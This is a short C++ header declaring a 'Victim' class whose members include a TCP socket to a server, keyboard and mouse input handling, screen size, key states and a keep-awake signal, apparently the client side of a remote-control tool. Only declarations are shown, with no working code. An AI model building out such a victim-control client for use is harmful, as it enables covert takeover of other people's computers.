#pragma once
#include <SFML/Network.hpp>
#include "Mlib/Util/util.hpp"
#include "Mlib/Io/keyboard.hpp"
#include "Mlib/Io/mouse.hpp"
#include <iostream>
#include <thread>
#include <fstream>

class Victim
{
public:
	Victim();
	int controlVictim();

private:
	void keepAwake();
	void connectServer();

	bool isConnected = false, isRunning = true;
	const Mlib::Vec2i screenSize = Mlib::displaySize();
	size_t lastAwakeSignal = Mlib::getTime();
	sf::TcpSocket server;
	bool keysStates[256];
	std::string name = "";
};